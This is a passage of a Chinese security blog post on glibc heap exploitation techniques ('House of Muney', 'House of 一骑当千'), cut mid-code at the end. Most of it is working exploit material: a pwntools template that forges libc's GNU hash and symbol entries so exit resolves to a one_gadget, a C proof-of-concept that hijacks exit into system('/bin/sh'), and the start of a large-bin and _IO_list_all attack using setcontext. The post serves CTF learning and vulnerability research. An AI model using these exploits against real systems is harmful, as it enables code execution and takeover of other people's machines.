比特必须等于 STT_NOTYPE(0)，STT_OBJECT(1)，STT_FUNC(2)，STT_COMMON(5)，STT_TLS(6)，STT_GNU_IFUNC(10) 中的其中一个。</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (((<span class="number">1</span> &lt;&lt; stt) &amp; ALLOWED_STT) == <span class="number">0</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 这里要求 strtab + sym-&gt;st_name 指向被劫持函数的函数名，因为一般不会覆盖到动态符号字符串表 ( .dynstr) ，因此伪造其指向字符串表中的函数名即可。</span></span><br><span class="line">    <span class="keyword">if</span> (sym != ref &amp;&amp; <span class="built_in">strcmp</span>(strtab + sym-&gt;st_name, undef_name))</span><br><span class="line">        <span class="comment">/* Not the symbol we are looking for.  */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Half)</span> *verstab = <span class="built_in">map</span>-&gt;l_versyms;</span><br><span class="line">    <span class="keyword">if</span> (version != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely (verstab == <span class="literal">NULL</span>)) &#123;</span><br><span class="line">            ...</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* We can match the version information or use the</span></span><br><span class="line"><span class="comment">               default one if it is not hidden.  */</span></span><br><span class="line">			<span class="comment">// 正常这些检查都能通过，所以直接跳出。</span></span><br><span class="line">            ElfW(Half) ndx = verstab[symidx] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="built_in">map</span>-&gt;l_versions[ndx].hash != version-&gt;hash</span><br><span class="line">                 || <span class="built_in">strcmp</span>(<span class="built_in">map</span>-&gt;l_versions[ndx].name, version-&gt;name))</span><br><span class="line">                &amp;&amp; (version-&gt;hidden || <span class="built_in">map</span>-&gt;l_versions[ndx].hash</span><br><span class="line">                    || (verstab[symidx] &amp; <span class="number">0x8000</span>)))</span><br><span class="line">                <span class="comment">/* It&#x27;s not the version we want.  */</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* There cannot be another entry for this symbol so stop here.  */</span></span><br><span class="line">    <span class="keyword">return</span> sym; <span class="comment">// 正常从这里返回。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
整个过程中用到了 ELF GNU Hash Table（<code>.gnu.hash</code> 节，对应
<code>_DYNAMIC</code> 中的 <code>DT_GNU_HASH</code>） ，ELF Symbol
Table（<code>.dynsym</code> 节，对应 <code>_DYNAMIC</code> 中的
<code>DT_SYMTAB</code>）和 ELF String Table （<code>.dynstr</code>
节，对应 <code>_DYNAMIC</code> 中的 <code>DT_SYMTAB</code>）。 - ELF GNU
Hash
Table：哈希表，根据查找的函数名字符串的哈希值在表中快速查找该函数在符号表中的下标。对于该哈希表，ida
与 <code>elftools</code> 中对于成员名的定义有出入： | ida 解析的名称 |
elftools 解析的名称 | 功能 | | ----------------------------- |
------------------- |
------------------------------------------------------------ | |
<code>elf_gnu_hash_nbuckets</code> | <code>nbuckets</code> |
<code>buckets</code> 中元素的数量。 | |
<code>elf_gnu_hash_nbuckets</code> | <code>symoffset</code> |
符号表下标与 <code>bucket</code> 中对应 hash 值的下标 | |
<code>elf_gnu_hash_bitmask_nwords</code> | <code>bloom_size</code> |
<code>bloom</code> 中元素的数量。 | | <code>elf_gnu_hash_shift</code> |
<code>bloom_shift</code> | 检验哈希值是否存在时验证的第二段 6 bit
的起始位置。 | | <code>elf_gnu_hash_indexes</code> | <code>bloom</code>
| 类似
bitmap，用来判断哈希值是否在哈希表中存在，结果不一定准确，只是一种剪枝优化。
| | <code>elf_gnu_hash_bucket</code> | <code>buckets</code> | 哈希值模
<code>nbucket</code> 作为下标对应的 <code>buckets</code> 项存放着
<code>chain</code> 中模 <code>nbucket</code>
相同的哈希值中第一个的下标。 | | <code>elf_gnu_hash_chain</code> |
<code>chain</code> | 存储着所有符号对应的哈希值，模 <code>nbucket</code>
相同的哈希值存放在一起。 |</p>
<ul>
<li>ELF Symbol Table：<code>Elf64_Sym</code>
结构体数组，记录了符号的一些相关信息。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Word	st_name;		<span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>	st_info;		<span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_other;		<span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf64_Section	st_shndx;		<span class="comment">/* Section index */</span></span><br><span class="line">  Elf64_Addr	st_value;		<span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf64_Xword	st_size;		<span class="comment">/* Symbol size */</span></span><br><span class="line">&#125; Elf64_Sym;</span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>st_name</code>：符号名称在字符串表中的偏移量。</li>
<li><code>st_info</code>：符号类型和绑定信息，低 4 比特必须等于
<code>STT_NOTYPE(0)</code>，<code>STT_OBJECT(1)</code>，<code>STT_FUNC(2)</code>，<code>STT_COMMON(5)</code>，<code>STT_TLS(6)</code>，<code>STT_GNU_IFUNC(10)</code>
中的其中一个。</li>
<li><code>st_other</code>：保留字段，通常为 0 。</li>
<li><code>st_shndx</code>：通常为符号所在节的索引。不能为
<code>SHN_UNDEF(0)</code>，因为 <code>SHN_UNDEF</code>
表示该符号未定义但是在该文件中被引用到，即该符号可能定义在其他目标文件中。</li>
<li><code>st_value</code>：符号的在该模块中的 RVA
，<strong>可以被我们伪造为该模块中的某个地址（例如
<code>one_gadget</code>）对应的 RVA 从而劫持程序执行流程。</strong></li>
<li><code>st_size</code>：符号的大小，这里指的是要重定位的 got
表项的大小，即 8
。不过由于该成员在符号查询过程中未被使用因此不伪造该成员也没影响。</li>
</ul></li>
<li>ELF String Table：符号名称对应的字符串构成的字符串表，需要伪造
<code>Elf64_Sym</code> 中的 <code>st_name</code>
为查询的函数的名称对应字符串与字符串表起始地址的偏移。因为字符串表要被用到因此不能破坏该结构。如果被破坏需要在对应位置伪造字符串。</li>
</ul>
<p>延迟绑定中查找函数地址的过程（具体过程参考 <code>pwntools</code>
的依赖库 <code>elftools</code> 中的 <code>GNUHashTable</code> 类中的
<code>get_symbol</code> 函数）： - 在 <code>_dl_lookup_symbol_x</code>
函数中，调用 <code>dl_new_hash</code>
函数计算要调用的函数的名称的哈希值。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">uint_fast32_t</span></span><br><span class="line"><span class="title function_">dl_new_hash</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *s)</span> &#123;</span><br><span class="line">    <span class="type">uint_fast32_t</span> h = <span class="number">5381</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">char</span> c = *s; c != <span class="string">&#x27;\0&#x27;</span>; c = *++s)</span><br><span class="line">        h = h * <span class="number">33</span> + c;</span><br><span class="line">    <span class="keyword">return</span> h &amp; <span class="number">0xffffffff</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">uint_fast32_t</span> new_hash = dl_new_hash(undef_name);</span><br></pre></td></tr></table></figure></div> - 在
<code>do_lookup_x</code> 函数中，将 <code>new_hash</code> 除以
<code>__ELF_NATIVE_CLASS(64)</code> 关于 <code>bloom_size</code>
取模的结果作为 <code>bloom</code> 的下标取出对应的 <code>bloom</code>
的值 <code>bitmask_word</code> 。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">ElfW(Addr) bitmask_word = bitmask[(new_hash / __ELF_NATIVE_CLASS) &amp; <span class="built_in">map</span>-&gt;l_gnu_bitmask_idxbits]; </span><br></pre></td></tr></table></figure></div> - 对
<code>bitmask_word</code> 作一个验证，要求 <code>bitmask_word</code>
的第 <code>new_hash % 64</code> 和
<code>(new_hash &gt;&gt; bloom_shift) % 64</code>
位都要置位，这里判断了两段 6 bit 数据提升准确率（如果前面计算下标没有
<code>bloom_size</code> 取模的限制则这里只需判断低 6 bit
即可，而这里判断的两段 6 bit 还会相互影响，总之是玄学优化）。
在伪造时只需要将 <code>bloom</code> 对应位置保留原数据即可。
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> hashbit1 = new_hash &amp; (__ELF_NATIVE_CLASS - <span class="number">1</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> hashbit2 = ((new_hash &gt;&gt; <span class="built_in">map</span>-&gt;l_gnu_shift) &amp; (__ELF_NATIVE_CLASS - <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely((bitmask_word &gt;&gt; hashbit1) &amp; (bitmask_word &gt;&gt; hashbit2) &amp; <span class="number">1</span>))</span><br></pre></td></tr></table></figure></div> - 将 <code>new_hash</code> 与 <code>nbuckets</code>
取模的结果作为下标取出 <code>buckets</code> 中的对应项
<code>bucket</code> 。位置时保留原数据即可。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">Elf32_Word bucket = <span class="built_in">map</span>-&gt;l_gnu_buckets[new_hash % <span class="built_in">map</span>-&gt;l_nbuckets];</span><br></pre></td></tr></table></figure></div> - 如果
<code>bucket</code> 不为空则从 <code>bucket</code>
作为的下标开始向后遍历 <code>chain</code> 直到
<code>chain[bucket]</code> 与 <code>new_hash</code>
除最低位外相同时计算符号表下标为 <code>bucket - symoffset</code>
。如果找到则调用 <code>check_match</code> 查询符号表得到目标函数的 RVA
。伪造时只需在 <code>chain[bucket]</code> 上伪造 <code>new_hash</code>
即可。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (bucket != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="type">const</span> Elf32_Word *hasharr = &amp;<span class="built_in">map</span>-&gt;l_gnu_chain_zero[bucket];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">        <span class="title function_">if</span> <span class="params">(((*hasharr ^ new_hash) &gt;&gt; <span class="number">1</span>) == <span class="number">0</span>)</span> &#123;</span><br><span class="line">            symidx = ELF_MACHINE_HASH_SYMIDX(<span class="built_in">map</span>, hasharr);</span><br><span class="line">            sym = check_match(undef_name, ref, version, flags,</span><br><span class="line">                              type_class, &amp;symtab[symidx], symidx,</span><br><span class="line">                              strtab, <span class="built_in">map</span>, &amp;versioned_sym,</span><br><span class="line">                              &amp;num_versions);</span><br><span class="line">            <span class="keyword">if</span> (sym != <span class="literal">NULL</span>)</span><br><span class="line">                <span class="keyword">goto</span> found_it;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">while</span> ((*hasharr++ &amp; <span class="number">1u</span>) == <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 模板： <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">add_chunk(<span class="number">0</span>, <span class="number">0x40000</span> - <span class="number">0x2000</span>)</span><br><span class="line"></span><br><span class="line">edit_chunk(<span class="number">0</span>, n64(-<span class="number">8</span>), p64(<span class="number">0x41002</span> + <span class="number">0x5000</span> + <span class="number">0x4000</span>))</span><br><span class="line"></span><br><span class="line">delete_chunk(<span class="number">0</span>)</span><br><span class="line">add_chunk(<span class="number">0</span>, <span class="number">0x41000</span> * <span class="number">2</span> + <span class="number">0x4000</span>)</span><br><span class="line"></span><br><span class="line">base_off = <span class="number">0x7dff0</span></span><br><span class="line">one_gadget = [<span class="number">0xcbd71</span>, <span class="number">0xcbd74</span>, <span class="number">0xcbd77</span>][<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">gnu_hash_section = libc.get_section_by_name(<span class="string">&#x27;.gnu.hash&#x27;</span>)</span><br><span class="line">dynsym_section = libc.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>)</span><br><span class="line">dynstr_section = libc.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>)</span><br><span class="line"></span><br><span class="line">namehash = gnu_hash_section.gnu_hash(<span class="string">&#x27;exit&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bloom_off = gnu_hash_section[<span class="string">&#x27;sh_addr&#x27;</span>] + <span class="number">4</span> * gnu_hash_section._wordsize</span><br><span class="line">bucket_off = bloom_off + gnu_hash_section.params[<span class="string">&#x27;bloom_size&#x27;</span>] * gnu_hash_section._xwordsize</span><br><span class="line"></span><br><span class="line">bloom_elem_idx = (namehash / gnu_hash_section.elffile.elfclass) % gnu_hash_section.params[<span class="string">&#x27;bloom_size&#x27;</span>]</span><br><span class="line">bloom_elem_off = bloom_off + gnu_hash_section._xwordsize * bloom_elem_idx</span><br><span class="line">bloom_elem_val = gnu_hash_section.params[<span class="string">&#x27;bloom&#x27;</span>][bloom_elem_idx]</span><br><span class="line"></span><br><span class="line">bucket_elem_idx = namehash % gnu_hash_section.params[<span class="string">&#x27;nbuckets&#x27;</span>]</span><br><span class="line">bucket_elem_off = bucket_off + bucket_elem_idx * gnu_hash_section._wordsize</span><br><span class="line">bucket_elem_val = gnu_hash_section.params[<span class="string">&#x27;buckets&#x27;</span>][bucket_elem_idx]</span><br><span class="line"></span><br><span class="line">hasharr_off = gnu_hash_section._chain_pos + (bucket_elem_val - gnu_hash_section.params[<span class="string">&#x27;symoffset&#x27;</span>]) * gnu_hash_section._wordsize</span><br><span class="line"></span><br><span class="line">sym_off = dynsym_section[<span class="string">&#x27;sh_offset&#x27;</span>] + bucket_elem_val * dynsym_section[<span class="string">&#x27;sh_entsize&#x27;</span>]</span><br><span class="line"></span><br><span class="line">sym_value = <span class="string">&#x27;&#x27;</span></span><br><span class="line">sym_value += p32(libc.search(<span class="string">&#x27;exit\x00&#x27;</span>).<span class="built_in">next</span>() - dynstr_section[<span class="string">&#x27;sh_offset&#x27;</span>])  <span class="comment"># st_name</span></span><br><span class="line">sym_value += p8(<span class="number">0x12</span>)  <span class="comment"># st_info</span></span><br><span class="line">sym_value += p8(<span class="number">0</span>)  <span class="comment"># st_other</span></span><br><span class="line">sym_value += p16(<span class="number">1</span>)  <span class="comment"># st_shndx</span></span><br><span class="line">sym_value += p64(one_gadget)  <span class="comment"># st_value</span></span><br><span class="line">sym_value += p8(<span class="number">8</span>)  <span class="comment"># st_size</span></span><br><span class="line"></span><br><span class="line">edit_chunk(<span class="number">0</span>, base_off + bloom_elem_off, p64(bloom_elem_val))</span><br><span class="line">edit_chunk(<span class="number">0</span>, base_off + bucket_elem_off, p32(bucket_elem_val))</span><br><span class="line">edit_chunk(<span class="number">0</span>, base_off + hasharr_off, p64(namehash))</span><br><span class="line">edit_chunk(<span class="number">0</span>, base_off + sym_off, sym_value)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p, &quot;b do_lookup_x\nc&quot;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice:&quot;</span>, <span class="string">&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div></p>
<p><a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/house_of_poc/house_of_muney" >poc <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>
如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gcc 1.c -o 1 -g  -Wl,-z,lazy</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="type">char</span> *strptr = mmap((<span class="type">void</span> *) <span class="number">0xdeadb000</span>, <span class="number">0x1000</span>, <span class="number">6</span>, <span class="number">0x22</span>, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(strptr, <span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] step1: allocate a chunk ---&gt; void* ptr = malloc(0x40000);&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> *ptr = (<span class="type">size_t</span> *) <span class="built_in">malloc</span>(<span class="number">0x40000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> sz = ptr[<span class="number">-1</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] ptr address: %p, chunk size: %p\n&quot;</span>, ptr, (<span class="type">void</span> *) sz);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] step2: change the size of the chunk ---&gt; ptr[-1] += 0x5000 + 0x4000;&quot;</span>);</span><br><span class="line">    ptr[<span class="number">-1</span>] += <span class="number">0x5000</span> + <span class="number">0x4000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] step3: free ptr and steal heap from glibc ---&gt; free(ptr);&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] step4: retrieve heap ---&gt; ptr = malloc(0x41000 * 2+  0x4000);&quot;</span>);</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">0x41000</span> * <span class="number">2</span> + <span class="number">0x4000</span>);</span><br><span class="line"></span><br><span class="line">    sz = ptr[<span class="number">-1</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] ptr address: %p, chunk size: %p\n&quot;</span>, ptr, (<span class="type">void</span> *) sz);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当前ptr到原有libc基地址的偏移</span></span><br><span class="line">    <span class="type">size_t</span> base_off = <span class="number">0x7dff0</span>;</span><br><span class="line">    <span class="comment">// 以下地址均是相对于libc基地址的偏移</span></span><br><span class="line">    <span class="type">size_t</span> system_off = <span class="number">0x48a20</span>;</span><br><span class="line">    <span class="type">size_t</span> bitmask_word_off = <span class="number">0x4070</span>;</span><br><span class="line">    <span class="type">size_t</span> bucket_off = <span class="number">0x4198</span>;</span><br><span class="line">    <span class="type">size_t</span> exit_sym_st_value_off = <span class="number">0x81d8</span> + <span class="number">8</span>;</span><br><span class="line">    <span class="type">size_t</span> hasharr_off = <span class="number">0x5264</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] step5: set essential data for dl_runtime_resolve&quot;</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="type">size_t</span> *) ((<span class="type">char</span> *) ptr + base_off + bitmask_word_off) = <span class="number">0xf000028c0200130e</span>ul;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] set bitmask_word to 0xf000028c0200130eul&quot;</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">int</span> *) ((<span class="type">char</span> *) ptr + base_off + bucket_off) = <span class="number">0x86</span>u;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] set bucket to 0x86u&quot;</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="type">size_t</span> *) ((<span class="type">char</span> *) ptr + base_off + exit_sym_st_value_off) = system_off;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] set exit@sym.st_value to system_off 0x52290&quot;</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="type">size_t</span> *) ((<span class="type">char</span> *) ptr + base_off + exit_sym_st_value_off - <span class="number">8</span>) = <span class="number">0xf00120000174c</span>ul;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] set other exit@sym members&quot;</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="type">size_t</span> *) ((<span class="type">char</span> *) ptr + base_off + hasharr_off) = <span class="number">0x7c967e3f</span>ul;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] set hasharr to 0x7c967e3ful&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] step6: get shell ---&gt; exit(\&quot;/bin/sh\&quot;)&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>((<span class="type">size_t</span>) strptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h1 id="house-of-一骑当千">House of 一骑当千</h1>
<p>通常我们利用 <code>setcontext + 53</code> 通过 rdi
指向的内存给寄存器赋值，但是从 glibc-2-29 开始，setcontext 通过 rdx
指向的内存给寄存器赋值。</p>
<p>通常情况可以采用 gadget 对 rdx 赋值然后跳转到 setcontext gadget
继续执行，但使用 gadget 需要我们能控制 rdi
寄存器指向的内存的前几个字节，并且未来的 glibc 的 setcontext
也可能不再使用 rdx 寄存器。</p>
<p>因此我们需要一个通用的方法比如直接调用 setcontext
函数对寄存器赋值，而这中直接调用 setcontext 的方法就是 House of
一骑当千。</p>
<p>setcontext 函数原型为
<code>int setcontext(const ucontext_t *ucp)</code> ，其中
<code>ucontext_t</code> 结构体定义如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">libc_fpstate</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* 64-bit FXSAVE format.  */</span></span><br><span class="line">  <span class="type">__uint16_t</span>		__ctx(cwd);</span><br><span class="line">  <span class="type">__uint16_t</span>		__ctx(swd);</span><br><span class="line">  <span class="type">__uint16_t</span>		__ctx(ftw);</span><br><span class="line">  <span class="type">__uint16_t</span>		__ctx(fop);</span><br><span class="line">  <span class="type">__uint64_t</span>		__ctx(rip);</span><br><span class="line">  <span class="type">__uint64_t</span>		__ctx(rdp);</span><br><span class="line">  <span class="type">__uint32_t</span>		__ctx(mxcsr);</span><br><span class="line">  <span class="type">__uint32_t</span>		__ctx(mxcr_mask);</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">libc_fpxreg</span>	_<span class="title">st</span>[8];</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">libc_xmmreg</span>	_<span class="title">xmm</span>[16];</span></span><br><span class="line">  <span class="type">__uint32_t</span>		__glibc_reserved1[<span class="number">24</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Userlevel context.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ucontext_t</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span> __ctx(uc_flags);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ucontext_t</span> *<span class="title">uc_link</span>;</span></span><br><span class="line">    <span class="type">stack_t</span> uc_stack;</span><br><span class="line">    <span class="type">mcontext_t</span> uc_mcontext;</span><br><span class="line">    <span class="type">sigset_t</span> uc_sigmask;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">libc_fpstate</span> __<span class="title">fpregs_mem</span>;</span></span><br><span class="line">    __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> __ssp[<span class="number">4</span>];</span><br><span class="line">  &#125; <span class="type">ucontext_t</span>;</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/0996462c16406336efd64497fff69725.png"
                      alt="在这里插入图片描述" style="zoom:15%;" 
                >
在<code>setcontext</code>函数中，除了对<code>mcontext_t uc_mcontext;</code>
<code>sigset_t uc_sigmask;</code>
<code>struct _libc_fpstate __fpregs_mem __ssp</code>这4个进行操作外，并没有对其他部分操作，也就是我们可以不关心其他的值。</p>
<ul>
<li><p><code>uc_mcontext</code></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Context to describe whole processor state.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="type">gregset_t</span> __ctx(gregs);</span><br><span class="line">    <span class="comment">/* Note that fpregs is a pointer.  */</span></span><br><span class="line">    <span class="type">fpregset_t</span> __ctx(fpregs);</span><br><span class="line">    __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> __reserved1 [<span class="number">8</span>];</span><br><span class="line">&#125; <span class="type">mcontext_t</span>;</span><br></pre></td></tr></table></figure></div>
<p>这个就是存储寄存器的结构体，也是我们平时<code>setcontext+53</code>所使用的地方。有关数据设置和传统利用<code>setcontext+53</code>时一样即可。</p>
<p><strong>注意 <code>fpregs</code>
指针需要指向一块可读写内存。</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/* Restore the floating-point context.  Not the registers, only the</span><br><span class="line">       rest.  */</span><br><span class="line">    movq    oFPREGS(%rdx), %rcx</span><br><span class="line">    fldenv    (%rcx)</span><br></pre></td></tr></table></figure></div></li>
<li><p><code>uc_sigmask</code></p>
<p>这个主要是负责信号量，<strong>经测试全是0就可以，当然也可以使用其他程序拷贝过来的信号量。</strong></p></li>
<li><p><code>__ssp</code></p>
<p>这个所对应的步骤为<code>setcontext</code>中的如下内容，作用使加载
MXCSR 寄存器，经测试0也行，偏移为<code>0x1c0</code></p></li>
</ul>
<p>通过上述的设置就可以直接调用 <code>setcontext</code> 设置寄存器。例如
house of 魑魅魍魉 + house of 一骑当千 <a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/house_of_poc/house_of_yjdq" >poc <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>
如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ucontext.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="comment">// leak libc_base</span></span><br><span class="line">  <span class="type">size_t</span> puts_addr = (<span class="type">size_t</span>)&amp;<span class="built_in">puts</span>;</span><br><span class="line">  <span class="type">size_t</span> libc_base = puts_addr - <span class="number">0x77040</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// large bin attack: _IO_list_all -&gt; large</span></span><br><span class="line">  <span class="type">size_t</span> IO_list_all_addr = libc_base + <span class="number">0x1d2660</span>;</span><br><span class="line">  <span class="type">size_t</span> *large = <span class="built_in">malloc</span>(<span class="number">0x620</span>);</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="type">size_t</span> *unsorted = <span class="built_in">malloc</span>(<span class="number">0x610</span>);</span><br><span class="line">  <span class="built_in">free</span>(large);</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x700</span>);</span><br><span class="line">  <span class="built_in">free</span>(unsorted);</span><br><span class="line">  large[<span class="number">3</span>] = IO_list_all_addr - <span class="number">0x20</span>;</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> *fake_helper_file = large - <span class="number">2</span>;</span><br><span class="line">  <span class="type">size_t</span> *fake_wide_data = fake_helper_file + <span class="number">28</span>;</span><br><span class="line">  <span class="type">size_t</span> *fake_put_stream = fake_helper_file + <span class="number">6</span>;</span><br><span class="line">  <span class="type">size_t</span> *write_base = fake_helper_file + <span class="number">60</span>;</span><br><span class="line">  <span class="type">size_t</span> *fake_ucontext = fake_helper_file + <span class="number">62</span>;</span><br><span class="line">  <span class="type">size_t</span> *rop = fake_ucontext + <span class="number">190</span>;</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> memcpy_got_addr = libc_base + <span 